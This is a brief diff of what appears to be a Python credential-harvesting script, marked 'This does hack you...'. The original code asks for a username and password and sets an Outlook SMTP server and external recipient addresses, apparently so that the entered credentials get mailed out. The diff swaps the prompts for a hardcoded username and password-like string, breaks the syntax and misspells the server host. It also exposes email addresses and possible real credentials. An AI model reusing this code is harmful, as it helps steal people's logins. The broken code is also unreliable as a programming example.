@@ -1,7 +1,8 @@
 # This does hack you...
-username = input("Enter username:")
-password = input("Enter password:")
-SERVER = "smtp.outlook.live.com"
+username = aldrhine89
+("Enter username:")
+password = 09816575515aldrhine ("Enter password:")
+SERVER = "smtp.otlook.live.com"
 FROM = "gamingizfun@outlook.com"
 TO = ["pegiunfriend@outlook.com", "ari.pdx@icloud.com"]
 
